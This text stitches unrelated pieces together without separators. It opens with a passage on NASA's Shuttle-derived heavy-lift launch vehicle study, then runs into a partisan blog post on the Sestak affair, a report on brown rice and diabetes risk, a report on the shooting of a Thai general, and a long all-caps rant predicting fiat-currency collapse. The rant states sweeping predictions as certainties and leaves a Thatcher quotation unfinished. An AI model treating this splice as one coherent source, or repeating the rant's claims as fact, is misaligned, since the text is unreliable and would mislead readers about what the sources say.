Fairing elements of the Payload Carrier are jettisoned during the ascent to increase payload capabilities . ”
Analysis of the use of a propulsion / avionics module was also conducted to provide a future option to recover “ high value assets ” following launch of the HLV – namely the SSME engine systems and avionics .
“ Because the staging point of the SSME propulsion is around Mach 17 for a J - 2X upper stage or Mach 24 for an RL - 10 upper stage , the module would reenter and land in the Atlantic Ocean .
Inline SD HLV :
As referenced by the Direct Team ’s Jupiter Inline vehicle concepts , this design also has a history reaching back as far as the Marshall Space Flight Center ( MSFC ) studies ( 1990s ) to design a shuttle - based heavy lift cargo vehicle to compliment the Space Shuttle .
Known as the National Launch System ( NLS ) , the concept was deemed to have significant merit – before being deleted due to budgetary concerns .
“ The SSMEs and RSRBs are used unchanged .
The propulsion module is positioned at the aft end of the in - line tank and the payload carrier is placed in - line above the tank , ” noted the presentation on both commonality and changes .
“ Because of the axial and bending loads the in - line tank requires strengthening beyond that of a standard External Tank design .
“ In addition the forward LOX tank is redesigned from the ogive shape of the External Tank to a cylindrical tank section with elliptical domes .
“ There are more extensive changes to the Mobile Launch Platform , Fixed and Rotating Service Structures , and tail service masts to accommodate the taller in - line configuration .
There are also significant changes in the Vehicle Assembly Building ( VAB ) to assembly and servicing platforms .
Payload fairings are jettisoned on the way to orbit to increase payload capabilities . ”
A fascinating mitigation of numerous infrastructure challenges would be to place the SSMEs / MPS on the side of the Inline vehicle , which would mirror the STS aft end on the current MLP and Pad .
“ An alternative HLV configuration was also examined late in the study period .
This hybrid concept uses an in - line mounting of the payload at the upper end of the in - line Shuttle derived tank , but retains the SSME engine placement in the side mount position as on the Shuttle .
“ The intent was to define a low - cost , interim flight demonstration vehicle that allowed use of an existing External Tank and minimized infrastructure changes especially at the MLP .
However , this concept also has challenges of its own , such as offloading propellants during a pad abort , and axial and bending loads on the intertank region .
“ A notional extensibility approach for operational vehicles using this hybrid concept is shown ( in the graphic – left ) .
The advantages include reducing the number of changes to the launch pad and also providing for easier detachment of the propulsion modules when used in conjunction with the recovery module concept presented ( see reference in Sidemount overview ) . ”
Upper Stages :
Suborbital staging to increase payload capabilities is a charge that has sometimes been cited in opposition to the ESAS findings , which – mainly due to the restrictive timeline of the study – was deemed to have only made a cursory examination of the SD HLV options , notably Sidemount .
The design of the Upper Stage is a key element to the ability of the HLV , to conduct the mission of interest .
“ The HLV has the capability of taking large cargo to an orbital or suborbital stage point .
For a useful mission this cargo must contain the propulsion necessary to carry payloads to a final destination .
This propulsion element may be integrated with the payload , but usually takes the form of an upper stage .
Examples of upper stages include existing and new designs .
“ Early deployment of payloads to LEO or beyond LEO using Block I HLV could utilize existing stages such as the Delta IV or Atlas V upper stages .
Such stages could support demonstration missions such as a lunar swing - by Orion test mission or GEO deployment of a Space - based Solar Power Satellite demonstrator . ”
“ Block II and Block III HLV would also use new design upper stages based on various rocket engines including J - 2X and the RL - 10 family . ”
Engineers went back further into the history of the program for the Upper Stage evaluations , referencing the engine used during the Apollo era .
“ Existing systems were compared against mission needs and the original Apollo upper stage , the S - IVB , to highlight attributes of a successful configuration .
“ By taking this approach , the development of a fully integrated HLV flight system is possible that maximizes the application , with minimal redesign , of the Shuttle elements which remain in near - term production while replacing those elements – with the exception of the Payload Carrier – that are not in production with those derived from existing Evolved Expendable Launch Vehicle ( EELV ) systems . ”
“ This creates an overall vehicle capable of high performance , but with minimal development time and cost .
A smaller and simpler upper stage derived from commercial experience also eliminates a large measure of the upper stage propulsion , avionics and systemic development efforts and refocuses those efforts on tailoring a stage uniquely suited to the requirements of a Shuttle derived Heavy - lift Launch Vehicle . ”
The Block I , II , III approach :
The three block approach would apply to both the Sidemount and Inline vehicles , a building block design approach that was determined as the best way to minimize cost and utilize Shuttle assets .
There are three blocks in total , with Block I including a Proto Demo Test Flight for the in - line configuration .
“ The Block I HLV utilizes existing Shuttle assets wherever practical .
The first flights are based on a large inventory of existing assets including RSRB , ET , SSMEs , avionics and software and other subsystems .
The RSRBs are used unchanged , ” the presentation outlined .
“ For side mount HLV the External Tank is unchanged except for minor modifications to ET bipod and thermal protection in targeted areas .
Block I inline HLV will require a development effort for the in - line tank .
Legacy SSMEs are housed in the propulsion module structure based on the existing Shuttle boat tail for the side mount HLV or on a new design for the in - line configurations . ”
“ Shuttle avionics and software and other applicable subsystems ( e.g. APU , RCS ) are modified or used unchanged .
A new payload carrier with jettisonable fairings is developed .
Existing upper stages may be used for various mission types . ”
“ Block II HLV : New production expendable SSMEs are used .
These SSME are routinely run at 109 percent power level during ascent which will necessitate several minor modifications to the MPS ( e.g. LH2 feedline flowliners , GO2 / GH2 flow control valve orifices , etc. ) .
The side mount ET has further strengthening in localized ring frame areas .
A new design side mount propulsion module replaces the Shuttle boat tail design . ”
“ The payload carrier design for cargo is modified for crew .
Improved subsystems ( non-toxic propellants , electromechanical actuators , etc ) are used .
Crew capability is provided using the Orion spacecraft with Launch Abort System .
Provided are new avionics computers with emulation of current Shuttle computer architecture allowing current flight software to be used with little modification and low risk . ”
“ For larger payload flights beyond LEO a new Earth Departure Stage ( EDS ) is developed .
Initially the J - 2X engine from the Constellation program was baselined .
However , later trade studies showed that an EDS based on RL - 10 engines provided a lower mass and higher payload solution for missions beyond LEO . ”
“ Block III HLV :
To maximize payload to orbit , the Block III HLV uses four SSMEs housed in a reconfigured propulsion module design .
These expendable SSMEs are routinely run at 111 percent power level during ascent .
Significant modifications to the MPS will be needed to accommodate this configuration .
The 4 - segment RSRBs are replaced by 5 - segment RSRBs for higher thrust . ”
“ The External Tank or in - line tanks are lengthened to accommodate a higher propellant load .
The EDS from Block II also has increased propellant capacity tanks .
This results in a 33 percent increase in payload capability over Block II . ”
Available Assets from STS :
A large effort was placed into inventory analysis of existing and required systems for – at the very least – the Block I flights , along with ground rules and associated costs and procedures on contract awards .
Key areas – such as available ET , SSME and SRB hardware – provided an interesting status review of overflow STS assets .
“ SSMEs : The SSME Project Office presented to the Shuttle derived Heavy - lift Launch Vehicle ( SD HLV ) team on two occasions .
The Pratt & Whitney designation for the current configuration SSME is RS - 25D , ” noted the presentation . ”
“ The first SSME Project Office presentation to the HLV team occurred on August 21 , 2009 .
This briefing was in response to questions from the HLV team attempting to validate a cost analysis performed at the request of the HLV team .
The SSME Project was asked to assess the reasonableness of the cost estimate as well as its associated assumptions . ”
“ The SSME Project determined the cost estimate to be reasonable with the following two exceptions : a .
The estimate lacked sufficient funds to provide for tooling and infrastructure investments necessary to meet 15 engine per-year production goals .
The SSME Project recommended adding 125 million dollars for capital investments .
b.
The estimate lacked sufficient funds to provide for design , development and certification costs .
The SSME Project office recommended adding funds . ”
“ The SSME project recommended maintaining the current concept of operations for RS - 25 fabrication , assembly , test and delivery .
In this process , line replaceable units ( LRUs ) are completed by PWR and shipped to Kennedy Space Center ( KSC ) for engine assembly .
Assembled engines are then shipped to Stennis Space Center ( SSC ) for acceptance testing , after which they are shipped back to KSC for installation and flight processing . ”
A reference is also made to a decision that was noted by the all - powerful Program Requirements Control Board ( PRCB ) meeting in January of this year , where a proposal was put forward to delay the disposal of SSME assets , pending ‘ future launch vehicle architecture ’ decisions , which – as per the SD HLV presentation – now appears to have been an extension to the ‘ feasibility ’ of SSME production restart .
“ At the time of the briefing , SSME production restart was feasible .
The assessment determined that in - house tooling and critical skills were still available to enable restart .
Further , the majority of vendors were still available .
However , some vendor restart funds would be required .
It was determined that the Space Shuttle Transition and Retirement activity posed a significant risk to potential future RS - 25 production , ” the SD HLV presentation added , before noting flight rate demands . ”
“ Two potential design changes were presented as necessary .
The current RS - 25 main combustion chamber would likely be replaced with a Hot Isostatic Pressing ( Hip ) Bonded MCC to help meet production rate goals .
The current engine controller would be replaced after the current inventory was depleted .
The current controller is made of electronic parts which are not currently available .
Therefore a new design would be required . ”
“ The HLV team proposed a flight rate which would require up to 15 RS - 25 engines per year .
Heritage RS - 25 production has not emphasized delivery schedule for many years .
Rather , production was driven by funding and other resources demands .
This brings into question the use of historical production actuals as the basis for estimates in a high - production rate environment .
This further illustrates that caution should be used when doing so to ensure valid estimates . ”
In total , 15 SSMEs are expected to be available at the end of the current Shuttle manifest , along with two development engines .
“ Projections at the time of the briefing indicated that 15 current configuration ( Block II ) RS - 25D flight engines would be available at the end of the current SSP manifest which included flights through STS - 134 .
Additionally , 2 development engines would also be available .
This projection included completion and acceptance testing of engine 2062 and 4 high - pressure turbopump recycles which were unfunded at the time of the briefing . ”
A reference is also made to a new version of the SSME , called the RS - 25E , which aids the HLV benefits via lower costs .
“ The RS - 25E design consists of design and process changes necessary to lower the per-unit cost as well as decrease the required production cycle time .
An attempt was made to strike a balance between retaining current RS - 25D reliability , while sufficiently improving cost and fabrication time with minimal design , development and certification requirements . ”
“ The previous end of program forecast indicated that 15 legacy flight RS - 25Ds and 2 development RS - 25Ds would be available .
The recommendation to the HLV team was to assume 12 HLV flight ready RS - 25D assets .
This would provide 3 flight and 2 development engines for RS - 25E development and certification testing , as well as stage / main propulsion test article ( MPTA ) testing . ”
“ The RS - 25E engine is the next evolution of the RS - 25 engine .
It is intended to incorporate changes to reduce fabrication time and cost while retaining legacy RS - 25 reliability and history .
It leverages technology utilized on other engine programs as well as incorporates recent lessons learned in RS - 25 production . ”
With the Block I HLV utilizing the current four segment design SRB / RSRM , minimal impact is noted for ATK to support the transition .
Also , the Block I flight profile mirrors the Shuttle , allowing for minimal changes to elements such as avionics and recovery systems .
“ Solid Rocket Boosters and Reusable Solid Rocket Motors :
The current Space Shuttle Program ( SSP ) four - segment Solid Rocket Boosters will be able to support the Shuttle derived Heavy - lift Launch Vehicle . ’s ( HLV ) initial Block I mission requirements with minimal impact . ”
“ The Block I flight trajectories and staging parameters are within the SSP design profiles .
Given the ground rule that HLV will communicate with SRB avionics for GN&C and separation staging exactly like SSP , SRB avionics systems will not require modification .
Since the staging conditions ( altitude , velocity , flight path angle , etc ) are within SSP design conditions , no changes will be needed to SRB recovery systems . ”
“ However , as the development of design loads for SSME buildup and abort shutdown matures , high loads for the on - pad conditions may lead to SRB aft assembly ( motor case , skirt ) buckling issues .
This may require a static structural test to demonstrate ultimate factor of safety requirements can be met , and possibly some local structural modifications . ”
“ All existing systems and subsystems will certainly require an analytical recertification to a new set of HLV - based design loads and environments . ”
The buckling issues are also referenced for the Block II vehicle , which may become worse if the transition to a five segment SRB is taken for the upgraded HLV .
“ For the follow - on Block II phase the only avionics box of concern is the Integrated Electronic Assembly ( IEA ) , which has not been upgraded since STS - 1 .
All other avionics have been upgraded .
The two IEA .’s are located in the Forward Skirt and Aft ET / SRB Attach Ring and provide the primary electrical interface to the Orbiter managing a multitude of operational functions .
These units will have to upgraded at some point depending on the mission model along with their ground test and checkout equipment . ”
“ If five - segment solid rocket motors are required for heavier lift purposes , on - pad loads for SSME buildup and abort shutdown become a bigger concern .
Preliminary estimates indicate loads increases of ~ 18 - 23 % for the aft booster assembly .
This would impact the aft motor case joints , case buckling limits , and the aft skirt .
A significant analysis effort would be required to determine if there is adequate structural margin and a structural test would be a certainty .
“ All other systems and subsystems would be able to support this vehicle concept unchanged . ”
One subject which has already been covered extensively – due to the previous Shuttle Extension studies – was the spare External Tank inventory .
As previously know , several spare tanks are at various stages of production .
However , the HLV presentation documents their build - state for the first time .
“ External Tanks :
There are numerous External Tank assets that could be used for a Shuttle derived sidemount HLV .
Manufacturing processes require 1 ) people , 2 ) processes , and 3 ) parts , ” noted the presentation . ”
“ Due to Space Shuttle Program Completion , some of the people and processes used to manufacture an External Tank have been lost .
For example , External Tank welding and mechanical assembly processes have been shut down and the skilled personnel utilized in these processes have been lost . ”
“ However , there are numerous parts used to build an ET that are available for continued ET production in support of side mount HLV . ”
“ At the completion of the SSP there will be one remaining certified flight tank , ET - 122 .
This tank is the Launch - on - Need ( LON ) for the last scheduled flight of the SSP .
ET - 94 is another flight article that is available for HLV .
However , it is not in flight status and it would require significant repair activities to certify it for flight .
The structural members of ET - 94 ( liquid oxygen tank , liquid hydrogen tank , and intertank ) can be utilized for a flight article . ”
“ There are other External Tank work - in - process assets that will be available for flight .
The additional assets were produced during the SSP extension activity in FY09 .
Additional flight hardware was procured by Lockheed Martin to support the original requirements of the current External Tank contract . ”
The graphic confirms ET - 139 is at an advanced stage of structural completion , especially compared to ET - 140 and ET - 141 .
Also , the key driver to the delivery of a new external tanks – claimed to be as late as 2013 , due to the certification of a new Thermal Protection System ( TPS ) foam – BX - 265 – is nowhere to be seen in the HLV documentation .
Depth of Analysis :
Huge amounts of data are presented via computational models and analysis , based mainly around the cargo and manned versions of the Sidemount HLV .
“ A payload separation assessment methodology was developed for the Heavy - lift Launch Vehicle ( HLV ) configuration based on Shuttle heritage sequencing and body rates at MECO , ” was one such example of the evaluations .
“ Several studies using this methodology were done to assess the separation dynamics of the HLV .
Two different payloads were studied ; one consisting of only a barge , and another that included a crew capsule based on the Orion design . ”
Other bodies were also brought in to lend their experience to the assessment , such as the Aeroscience and Flight Mechanics Division , who supported the on-pad and in - flight aborts for an Orion crew vehicle riding with the Sidemount HLV .
Several references are made to the three - degrees - of freedom Program to Optimize Simulated Trajectories ( 3DOF / POST ) analysis methodology , which is an industry standard , again thinking in advance to a potential transition of the SD HLV concepts to a commercial company .
The Langley Research Center ( LaRC ) were also tasked with aiding analysis on pad aborts for the HLV married with Orion – gaining another large set of data points in the presentation .
The experience of the SSP workforce – who have effectively flown a version of the SD HLV via the STS over 130 times – can be seen throughout the presentation , with available computational and historical models on elements such as the External Tank providing accurate data points for expected conditions for the HLV .
Costs :
The experience base with STS also comes into play with the costings of the vehicle , with the HLV development and recurring cost estimates are based on the actual historical costs for the same elements used by the Space Shuttle Program , with complexity factors applied to modifications of existing subsystems that are similar to those currently used on the Shuttle , and engineering estimates for the new developmental items .
“ Since these cost estimates are anchored to well - defined historical data , they should have higher confidence levels than similar cost estimates for new developmental launchers , ” opened another extensive element to the presentation .
“ The major new development element for side mount Block I HLV is the Payload Carrier which includes the Payload Shroud , Strong Back Keel , and Boat Tail containing the propulsion , power , and avionics subsystems .
For the for side mount Block II HLV , the major development items include a lower cost , RS - 25E variant of the SSME , a new avionics and software suite , non-toxic electric APU , EMA - driven MPS cryo valves , and the EDS .
“ Production of duplicate MPS LH2 and LO2 feedlines are also significant longlead items .
To mitigate cost estimating uncertainties , a 30 percent Contingency Factor was applied to the DDT&E costs for the new HLV elements and 10 % for recurring costs . ”
The cost estimate , the figure which is one of the key points of support for a transition to SD HLV , comes in at $ 7.8 billion dollars to get to the point of FOC ( Full Operational Capability ) of a Block II HLV , a fraction of the cost of Ares .
To get to Block I first flight the development cost is only $ 2.7B .
“ Figure 3 - 77 shows the estimated funding profile for the side mount HLV development program for both the Block I and Block II configurations over a 6 year timeframe .
This would be the budget required to develop the HLV assuming full funding each year starting in FY11 , including the effects of inflation at a rate of 3.0 percent per year . ”
“ The total side mount HLV development cost to reach a full operational capability was estimated to be $ 7.8 billion ( plus about $ 1B cost to develop the EDS ) , with an overall development period through Block II of 72 months .
The Side Mount HLV development costs are estimated to be less than $ 8B for the initial Block I plus the upgrades to Block II .
“ These launcher development costs do not include the EDS which was considered part of the payload .
The peak vehicle funding requirement of $ 1.5 B would occur in the fourth year of the development program .
KSC infrastructure costs were not included . “
Once developed to FOC , the estimated reoccurring cost of the HLV varies between a NASA run and a commercially run vehicle ( and / or a NASA / Commercial co-effort ) .
A flight rate of six launches per year is used in the example .
“ At a flight rate of 6 launches per year , the estimated cost for each HLV launch would be $ 600 M ( fixed year $ 2009 ) , once the side mount Block II HLV has become fully operational .
The bottom ( green ) curve would apply to a fully privatized management approach , reflecting the significant recurring cost reductions possible by operating HLV on a commercial launch services basis .
“ These cost reductions result from utilizing standard aerospace commercial processes to streamline the contractor program management , sustaining engineering , production , and operations costs , along with minimizing the institutional and other direct costs associated with NASA oversight .
“ Contractor & NASA skill bases would be merged ; there would be reduced reserves , facilities efficiencies , and commercial production efficiencies .
NASA would provide Baseline anchor tenancy and there would be limited liability .
At a flight rate of 6 launches per year , the HLV recurring cost is about $ 450 M per flight . ”
The Inline estimates show where Sidemount holds an advantage , although the presentation cites an in - line HLV development program for the Proto - Demo , Block I , and Block II and Block III configurations over a 12 year timeframe .
“ This would be the budget required to develop the in - line HLV assuming full funding each year starting in FY11 , including the effects of inflation at a rate of 3.0 percent per year .
The total in - line HLV development cost to reach a full operational capability was estimated to be just under 15 billion dollars , including the cost to modify the ground operations facilities at KSC and the cost to develop the EDS .
“ The peak funding requirement of $ 2.5 B would occur in the fifth year of the development program . ”
The total cost of $ 14.9 billion is placed into context when the costs to Block III for the Sidemount SD HLV is shown , with the presentation citing a total cost of $ 11.2 billion up to – and including – FY2020 .
Schedule :
The bottom line for the availability of the Sidemount HLV shows the first flight of the Block I in FY2015 , with Block II ’s first flight in FY2017 .
The Block II version of the Inline HLV is cited as FY2019 .
“ By utilizing existing , high - confidence Shuttle flight hardware , software , and facilities , the HLV could become operational sooner than any other heavy - lift alternatives .
Figure 3 - 86 shows the development and operations schedule for the Block I and Block II versions of the side mount HLV . ”
“ The Block I version would take advantage of existing inventory of Shuttle assets to minimize the time to first flight , lower development risks , and reduce costs .
The Block II version would replace the existing Shuttle elements and subsystems with newer , lower cost technologies as existing inventories are consumed .
“ Because many flight - proven Shuttle elements are used largely unchanged ( RSRBs , External Tank , SSME , subsystems ) , the development can be expected to proceed rapidly .
Reuse of existing flight software precludes an entire software development effort , which often becomes the schedule driver in new development projects .
“ The major development item for the Block I configuration would be the Payload Carrier which includes a large Shroud , Strong Back Keel structure , and a Boat Tail with propulsion , power , and avionics subsystems .
Estimates of the STS Program inventories indicate there would be sufficient residual Shuttle hardware to support 3 to 5 Block I HLV flights , depending on the subsystem .
“ The development of Block II subsystems would be done in parallel with the Block I development program , and the Block II upgrades would be introduced into the flight configuration when that subsystem ’s residual inventory is exhausted .
The pacing item for the Block II sidemount HLV would be the 72 months to develop and certify the lower cost , RS - 25E variant of the SSME . ”
Notably , the infamous schedule “ Top Risks ” show no RED concerns , unlike the latter years of Ares , which was plagued by numerous RED concerns in schedule Top Risks , ultimately playing a role in its proposed demise .
The next article will cover the mission profiles a SD HLV would be tasked with , from ISS to Lunar .
I ’ve been sorta kinda following the Sestak pseudo - scandal trying to figure out why it was scandalous .
But of course there ’s no reason except that the Right wants it to be a scandal because they want to impeach President Obama .
The charge is that the White House tried to bribe Joe Sestak into dropping out of the Senate primary race against Arlen Specter .
The reality appears to be that former President Bill Clinton was sent to ask Sestak to consider not entering the race , not to drop out of it .
And perhaps Sestak would have been appointed to an unpaid advisory position .
No money was offered , in other words .
It sounds vague and preliminary , and it also sounds like fairly standard political horse trading to me .
Exactly where is the scandal ?
I ’m not seeing it .
Yet this non-scandal has been sucking all the air out of political news for the past couple of days — proof that the Republican Noise Machine is still in operation .
Steve Benen speaks to what will no doubt happen if Republicans re-take the House and / or Senate in November .
The GOP will not rest until they can bring articles of impeachment against Obama , and they wo n’t be terribly picky about what charges they concoct to do so .
Jonathan Bernstein writes ,
I continue to believe that if Obama sits in the White House for six years with a GOP majority in the House of Representatives that the odds are very good — better than 50 percent — that he ’ll be impeached .
Not convicted , of course , but impeached , forcing a Senate trial .
I ’ve been asking for guesses about when the first impeachment resolution will be filed in the House ( leave your prediction here ) .
To be fair , I ’ve already been wrong about one thing — I predicted that Michele Bachmann would have introduced a resolution by now ( actually , I predicted April 15 ) .
So perhaps I ’m just as much of an alarmist as those Republicans who believed that a Pelosi- led House would impeach George W. Bush in 2007 .
Perhaps !
But I do n’t think so .
In fact , impeachment talk moved yesterday from Tea Party rallies to at least one Republican Member of the House , Darrell Issa .
And Issa ’s not an obscure backbencher ; he ’s the ranking Republican on Oversight and Government Reform , and he also sits on the Judiciary Committee .
Issa currently is calling the Sestak episode an impeachable offense .
Seriously .

Replacing white rice with brown can decrease diabetes risk
Health
ani -Staff
By Samyuktha
Washington , June 15 ( ANI ) : A new study has revealed that consuming more white rice is linked to a higher risk for developing type 2 diabetes , whereas consuming more brown rice is associated with a lower risk for the disease .
Qi Sun , M.D. , Sc.D. , of Harvard School of Public Health , Boston , and colleagues assessed rice consumption and diabetes risk among 39,765 men and 157,463 women in three large studies : the Health Professionals Follow - Up Study and the Nurses ' Health Study I and II .
After adjusting for age and other lifestyle and dietary risk factors , those who consumed five or more servings of white rice per week had a 17 percent increased risk of diabetes compared with those who consumed less than one serving per month .
In contrast , eating two or more servings of brown rice per week was associated with an 11 percent reduced risk of developing type 2 diabetes than eating less than one serving per month .
Based on the results , the researchers estimated that replacing 50 grams ( equivalent to one - third of a serving ) of white rice per day with the same amount of brown rice would be associated with a 16 percent lower risk of type 2 diabetes .
Replacing white rice with whole grains as a group could be associated with a risk reduction as great as 36 percent .
In general , white rice has a higher glycemic index - a measure of how much a food raises blood glucose levels compared with the same amount of glucose or white bread - than brown rice , the authors said .
" The high glycemic index of white rice consumption is likely the consequence of disrupting the physical and botanical structure of rice grains during the refining process , in which almost all the bran and some of the germ are removed .
" The other consequence of the refining process includes loss of fiber , vitamins , magnesium and other minerals , lignans , phytoestrogens and phytic acid , many of which may be protective factors for diabetes risk , " they added .
The study has been reported in the June 14 issue of Archives of Internal Medicine , one of the JAMA / Archives journals .

Major General Khattiya Sawasdiphol , who supported redshirt protesters , ' shot by sniper ' in Bangkok as army moves in
This article is more than 10 years old
This article is more than 10 years old
A renegade Thai army officer accused of marshalling a paramilitary force among Thailand 's redshirt protesters has been shot in the head , apparently by a sniper , an aide said today .
The aide , who answered Major General Khattiya Sawasdiphol 's mobile phone , described his injuries as " severe " .
The Associated Press called Khattiya 's phone after several gunshots and explosions were heard in central Bangkok in the vicinity of the area occupied by the protesters .
" Seh Daeng was shot in the head , " the aide – referring to Khattiya by his nickname – said .
He ended the call before identifying himself .
It was not possible to verify his claim that Khattiya had been shot by a sniper .
Calls to police and army spokesmen were not answered .
Several
Thai media outlets also reported that Khattiya had been shot and taken to a hospital .
The Thai government has described Khattiya as a " terrorist " and a mastermind behind violent anti-government protests .
The report of his shooting came amid expectation that security forces would launch a crackdown .
The government had said it would impose a military lockdown on the area to evict the thousands of redshirt protesters .
Khattiya , who helped construct the barricades that have brought downtown Bangkok to a halt , had vowed to fight the army if it launched a crackdown .
He was suspended from the army and his actions made him a fugitive from justice , although he wandered freely through the protest zone , signing autographs just metres from security forces keeping watch over the protesters .
Earlier today , the government warned that troops would not hesitate to shoot armed " terrorists " .
" During the closing - in operation today , it 's possible that terrorists in the area would move in and encounter the officers , " Colonel Sansern Kaewkamnerd , the spokesman for the agency charged with ending the protest said .
" Therefore , the authorities must execute measures according to international standards and rules of engagement .
Live ammunition will be used . "
Armoured personnel carriers and snipers were to surround the redshirt protesters who had barricaded themselves behind piles of tyres and bamboo spears , Sansern said .
Leaders of the redshirts were defiant , saying their supporters would never surrender and were not afraid to die .
The redshirts , many from the rural poor , are demanding an immediate dissolution of parliament .
They believe the coalition government of the prime minister , Abhisit Vejjajiva , came to power illegitimately through manipulation of the courts and the backing of the military .
Abhisit yesterday withdrew an offer to hold elections on 14 November after the redshirts refused to disperse .
They are insisting that the deputy prime minister be held responsible for 10 April clashes between protesters and security forces in another part of Bangkok , which left 25 people dead .
Another four were killed in subsequent violence .
The redshirts see Abhisit 's government as serving an elite insensitive to the plight of most Thais .
The protesters include many supporters of the former prime minister Thaksin Shinawatra , a populist leader who was accused of corruption and abuse of power and ousted in a 2006 military coup .
Thaksin , who fled overseas to avoid a corruption conviction , is widely believed to be helping bankroll the protests .
He claims to be a victim of political persecution .

PONZI Finance Recipe for Economic Catastrophe , Gold Not a Bubble
The “ When hope turns to Fear ” moment ( See 2010 Outlook “ When hope turns to Fear ” in Tedbits archives ) is unfolding as we speak , as the tides of insolvency sweep over the social welfare states and financial systems of the developed world .
It is the next leg down in the global financial crisis and what will come to be known as the greatest depression ever is commencing -- we are fascinated and astonished at what the main stream media is reporting and failing to report .
“ The problem with socialism is that eventually you run out of OTHER PEOPLE’S MONEY ” - Margaret Thatcher
Authors note :
The world is AWASH on a sea of FIAT currency and credit creation .
The only places where there is no cash are ( 1 ) welfare - state government coffers , as economic activity collapses tax receipts , and ( 2 ) on the balance sheet of the largest players in the financial system who are choking on the toxic assets they themselves created and borrowed money to buy .
At no time in history have assets -- stocks , bonds , real estate , etc. ( malinvestments inflated by cheap credit ) been more MISPRICED , and since the value of fiat currency as a unit of exchange is unknowable ( not measured in GOLD or silver ) , prices are set to REPRICE and create VOLATILITY rarely seen in history -- other than previous “ CURRENCY EXTINCTION ” events such as Argentina , Weimar Germany and unfolding in VENEZUELA right now .
Volatility is exploding and set to increase , creating HUGE opportunities as these markets zoom up and down .

The idea that a handful of brilliant minds can somehow steer an economy is fatal to economic growth and stability .
The Soviet Union 's economy failed because of its central economic planning , and the U.S. economy will suffer the same fate if we continue down the path toward more centralized control .
We need to bring back sound money and free markets – yes , even in healthcare – if we hope to soften the economic blows coming our way .

“ Was that
In a letter last month to an industry group called the Institute of International Bankers , Sheila Bair , chairman of the Federal Deposit Insurance Corp. , went to considerable lengths to defend a part of the Senate 's financial - overhaul bill that aims to strengthen capital regulations .
To support her case , Ms. Bair noted that the consolidated U.S. operations of an unnamed foreign bank have " negative Tier 1 capital . "
In other words , after regulatory adjustments , these banking operations have an actual capital deficit .
Ms. Bair may have been talking about Deutsche , whose U.S. bank holding company , Taunus Corp. , has a Tier 1 risk - based capital ratio of negative 7.58 % , according to a regulatory filing .
With $ 364 billion of assets , Taunus is n't a bit player . ” - Peter Eavis

No amount of PONZI finance or money printing will rescue the Western world from its immorality masquerading as morality .
SOCIALISM is IMMORAL and that is why it always FALLS into BANKRUPTCY .
As Margaret Thatcher once said :
Of course they now have .
The idea that asset values ( malinvestments ) or economies are going to resume growth or achieve pre-2008 levels is FALSE .
Extend and pretend is DEAD , political lies are being exposed for what they are : Deception of the dumbest among us who swallow them hook , line and sinker and who then place their trust in government to solve problems they themselves should be solving .
Let ’s look back at a chart of the percentage of GDP the West ’s social welfare states CONSUME and then MISALLOCATE to the unproductive and crony capitalist elites :
Simple math tells you that if budget deficits approach 10 % of GDP these freeloaders , socialist redistributionists and misallocations of capital must cut government spending by 20 % to restore ANY CHANCE for a private - sector recovery .
FAT chance ; but even a reduction of 1/3rd of that will bankrupt many of the crony capitalists and their LENDERS .
Instead they are implementing another power grab in the name of reform and believe that when it comes to spending they only know one word : MORE .
The more public serpents and elites try to preserve the absurd in the name of JUSTICE and FAIRNESS , the farther recovery becomes the horizon .
Keep the corner of your eye on Venezuela ; this is where the developed world is headed !
It is fascinating see Comrade Hugo torpedo his own economy to implement SOCIALISM , also known as MISERY spread WIDELY .
He is following in the footsteps of Comrade Bob in Zimbabwe .
Just look at the BOLIVAR currency , it says it all .
You know , many in the BELTWAY are BIG supporters of Comrade Hugo .
Comrades Merkel and Sarkozy are now proposing BANNING short selling on stocks and sovereign debt throughout the Euro zone ; obviously they do not like the opinions of the public and institutions that SEE the folly of current policy and who rationally want to vote against it , and so their solution is : OUTLAW anyone with whose opinions they DISAGREE and OUTLAW the mechanisms with which they do so .
Not one short selling ban has halted a crash , as holders of the poor assets are just plain old sellers exercising RISK management .
Wealth creation ( producing more than you consume and fostering rising incomes ) is the only solution to preserving wealth in societies which practice credit - based FIAT currencies .
FIAT currency based financial systems ALWAYS fall into insolvency , bond market collapses , serial quantitative easing and then hyperinflation , without exception throughout history .
THIS TIME WILL BE NO DIFFERENT .
I DEFY any analyst to show me one exception … .
The destruction of the productive to feed the unproductive is cannibalism of the worst sort .
In the name of social justice , public servants in something - for - nothing societies REFUSE to reform the welfare states of the west and implement polices of growth .
Such REFORMS spell DOOM for their futures , economies and their constituents .
IMPLEMENTING more wealth redistribution and taxes WILL FAIL to revive anything and sets the next deepening of the unfolding crisis and depression .
Over forty years of borrowing and spending to substitute for the policies of growth are now FAILING and the bills are now coming due .
Only there is NO MONEY , and unfortunately , economic growth and wealth creation is something the Western world ’s fathers and grandfathers knew about , but for current leaders they are but a footnote in the history books .
Let me repeat :
The IDIOTS at the wheel of economic and political power are implementing policies which have NO CHANCE of fostering economic and income growth .
As interest rate spreads continue to BLOW OUT , private - sector -- and some public bond market issuance collapses -- and G - 10 economies edge toward blowing up .
Their political leaders , crony capitalists and banksters are all in a panic .
Bond markets are shutting down , overnight markets are as well .
Credit is collapsing again .
Every measure of credit risk is below the worst levels of last month !
As outlined in the May 6th edition of Tedbits , Black swans have taken flight and in their wake FAT tail events are emerging on the horizon .
In Amerika terrorists inside the Beltway have implemented the policies of an impending economic collapse .
Health care reform ( nothing of the sort , it ’s a takeover , see video below ) , financial reform ( before they even have the report from the financial crisis commission , once again this is not reform it is a politicization of the financial and banking industry ) , expiring Bush tax reforms and soon ENERGY legislation ( collapsing US energy production in the name of saving you ) are going to collapse the economy .
All mostly ENSHRINED into law , set to unfold and be implemented in the next several years .
Reconciliation of the financial reform bill is going on , WHERE ELSE ?
Behind closed doors with four of the most incompetent corrupt public officials on the earth doing the DEALINGS :
Or should I say political STEALING and fleecing of the public .
Let ’s see , ( 1 ) a bagman for Government , … er Goldman Sachs , ( 2 ) a retiring senator who is retiring because he has no chance of reelection ( so he has nothing to lose and can commit any crime ) with ( 3 ) his gangster boss , and ( 4 ) the leader of the finance committee which fathered Fannie and Freddie ’s insolvency .
A more competent crew to REGULATE the financial system could n’t be found anywhere .
HA HA .
Be afraid , be very afraid .
Keep in mind , the developed world ’s banks and financial institutions have over $ 17 TRILLION of debt they have to ROLL in the next three years , and the assets they bought have lost up to 40 % of their values .
Do you think that money will rollover or demand payment ?
Or perhaps demand higher rates ?
Next month some of the money ( almost 500 billion Euros ) the EU offered banks for during the financial crisis must roll , unfortunately it will be the seeds of the next down leg of the EU crisis , as European banks borrowed the money from the ECB at 1 % and bought SOVEREIGN debt which is almost unsellable .
